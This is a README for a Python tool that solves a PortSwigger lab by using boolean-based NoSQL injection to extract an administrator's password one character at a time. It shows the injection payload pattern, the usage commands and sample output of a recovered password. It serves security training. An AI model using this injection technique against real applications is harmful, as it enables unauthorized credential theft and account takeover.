# nosql_extract.py

> Boolean-based NoSQL injection extractor for PortSwigger's  
> **[Exploiting NoSQL injection to extract data](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data)** lab.

---

## How it works

The `/user/lookup` endpoint passes user input directly into a MongoDB query.  
By injecting JavaScript boolean conditions, we can probe the administrator's password one character at a time.

```
administrator' && this.password[0]=='a   →  user found    = 'a' is correct
administrator' && this.password[0]=='b   →  user not found = 'b' is wrong
```

The script automates this across all positions concurrently using `asyncio`.

---

## Requirements

```bash
pip install aiohttp beautifulsoup4 lxml
```

---

## Usage

```bash
python3 nosql_extract.py <LAB_URL>
```

```bash
python3 nosql_extract.py https://0abc123.web-security-academy.net
```

---

## Example output

```
[*] Target: https://0abc123.web-security-academy.net

[*] Logging in as wiener ...
[+] Session OK

[*] Finding password length...
[+] Length: 8
[*] Extracting password (208 requests)...

[+] Password: kj3hgx2p
[*] Logging in as administrator ...
[✓] Solved! → administrator : kj3hgx2p
```

---

## Author

**Yami05** · [GitHub](https://github.com/YAMI05-05) · [TryHackMe](https://tryhackme.com/p/CodeDWill)
